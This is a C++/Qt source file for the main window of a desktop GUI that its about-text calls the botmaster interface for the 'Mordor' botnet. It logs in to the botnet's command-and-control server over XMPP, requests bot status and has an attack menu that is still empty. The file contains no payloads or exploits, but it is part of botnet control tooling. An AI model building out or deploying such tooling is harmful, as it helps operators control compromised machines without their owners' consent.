#include "mainwindow.h"
#include "global.h"
#include "centralwidget.h"
#include "connectdialog.h"
#include "xmppclient.h"
#include "getstatuscommand.h"
#include "botstateresponse.h"
#include <QAction>
#include <QMenu>
#include <QMenuBar>
#include <QToolBar>
#include <QStatusBar>
#include <QLabel>
#include <QCloseEvent>
#include <QMessageBox>
#include <QDebug>

MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent)
{
    _xmppClient = new XmppClient(APPLICATION_NAME);
    _xmppClient -> setParent(this);

    createWidgets();
    createConnections();
    setWindowTitle(APPLICATION_NAME);
    //setWindowIcon(QIcon(""));
    setConnected(false);
}

void MainWindow::closeEvent(QCloseEvent *event)
{
    if(verifyExit()) {
        disconnectFromCC();
        event -> accept();
    } else
        event -> ignore();
}

void MainWindow::connectToCC()
{
    ConnectDialog dialog(this);

    if(dialog.exec() == QDialog::Accepted) {
        QString server = dialog.domain();
        QString username = dialog.username();
        QString password = dialog.password();

        _xmppClient -> connectToServer(QString("%1@%2").arg(username).arg(server), password);
    }
}

void MainWindow::disconnectFromCC()
{
    if(_xmppClient -> isConnected())
        _xmppClient -> disconnectFromServer();
}

void MainWindow::about()
{
    QMessageBox::about(this, tr("About %1").arg(APPLICATION_NAME),
                             tr("<h2>%1 %2</h2>"
                                "<h3>GUI para botmaster de la botnet Mordor</h3>"
                                "<p>(C) %3 %4 <a href= \"mailto:%5\" >%5</a></p>"
                                "<p><a href= \"%6\" >%6</a></p>"
                                "<p>Licensed under <a href=\"http://www.gnu.org/licenses/gpl.html\" >GNU General Public License version 3</a></p>")
                             .arg(APPLICATION_NAME_LONG)
                             .arg(APPLICATION_VERSION)
                             .arg(APPLICATION_YEARS)
                             .arg(AUTHOR_NAME)
                             .arg(AUTHOR_EMAIL)
                             .arg(APPLICATION_WEB));
}

void MainWindow::readyOnXmppClient()
{
    qDebug() << "Command && Control ready";

    setConnected(true);

    Message *message = Message::createFromType("GET_STATUS_CMD");

    _xmppClient -> sendCommand(*message);

    delete message;
}

void MainWindow::disconnectedOnXmppClient()
{
    qDebug() << "Disconnected from server";

    setConnected(false);
}

void MainWindow::responseReceivedOnXmppClient(const Message& response)
{
    qDebug() << "Response received from" << response.from();
}

void MainWindow::createWidgets()
{
    createCentralWidget();
    createActions();
    createMenus();
    createToolBar();
    createStatusBar();
}

void MainWindow::createCentralWidget()
{
    _centralWidget = new CentralWidget;

    setCentralWidget(_centralWidget);
}

void MainWindow::createActions()
{
    _connectToCCAction = new QAction(tr("&Conectar a CC..."), this);
    //_connectToCCAction->setIcon(QIcon(""));
    _connectToCCAction -> setStatusTip(tr("Establecer conexion con el CC de la Botnet"));

    _disconnectFromCCAction = new QAction(tr("&Desconectar del CC"), this);
    //_disconnectFromCCAction->setIcon(QIcon(""));
    _disconnectFromCCAction -> setStatusTip(tr("Cerrar conexion con el CC"));

    _exitAction = new QAction(tr("&Salir"), this);
    //_exitAction->setIcon(QIcon(""));
    _exitAction -> setStatusTip(tr("Salir de la aplicacion"));

    _aboutAction = new QAction(tr("Acerca de"), this);
    //_aboutAction->setIcon(QIcon(""));
    _aboutAction -> setStatusTip(tr("Muestra informacion acerca de la aplicacion"));
}

void MainWindow::createMenus()
{
    _applicationMenu = menuBar() -> addMenu(tr("A&plicacion"));
    _applicationMenu -> addAction(_connectToCCAction);
    _applicationMenu -> addAction(_disconnectFromCCAction);
    _applicationMenu -> addAction(_exitAction);

    _attackMenu = menuBar() -> addMenu(tr("&Ataque"));

    _helpMenu = menuBar() -> addMenu(tr("A&yuda"));
    _helpMenu -> addAction(_aboutAction);
}

void MainWindow::createToolBar()
{
    _applicationToolBar = addToolBar(tr("Aplicacion"));
    _applicationToolBar -> addAction(_connectToCCAction);
    _applicationToolBar -> addAction(_disconnectFromCCAction);

    _attackToolBar = addToolBar(tr("Ataque"));
}

void MainWindow::createStatusBar()
{
    _ccLabel = new QLabel;

    statusBar() -> addWidget(_ccLabel);
}

void MainWindow::createConnections()
{
    connect(_connectToCCAction, SIGNAL(triggered()),
            this, SLOT(connectToCC()));
    connect(_disconnectFromCCAction, SIGNAL(triggered()),
            this, SLOT(disconnectFromCC()));
    connect(_exitAction, SIGNAL(triggered()),
            this, SLOT(close()));
    connect(_aboutAction, SIGNAL(triggered()),
            this, SLOT(about()));
    connect(_xmppClient, SIGNAL(ready()),
            this, SLOT(readyOnXmppClient()));
    connect(_xmppClient, SIGNAL(disconnected()),
            this, SLOT(disconnectedOnXmppClient()));
    connect(_xmppClient, SIGNAL(responseReceived(const Message&)),
            this, SLOT(responseReceivedOnXmppClient(const Message&)));
}

void MainWindow::setConnected(bool connected)
{
    _connected = connected;

    _centralWidget -> setEnabled(_connected);
    _connectToCCAction -> setEnabled(!_connected);
    _disconnectFromCCAction -> setEnabled(_connected);
    _ccLabel -> setText(_connected ? tr("Conectado como %1").arg(_xmppClient -> configuration().jid()) : tr("Desconectado"));
}

bool MainWindow::verifyExit()
{
    return QMessageBox::question(this, tr("Confirmar salida"),
                                 tr("¿Esta seguro de querer abandonar la aplicacion?"),
                                 QMessageBox::Yes | QMessageBox::Default |
                                 QMessageBox::No) == QMessageBox::Yes;
}
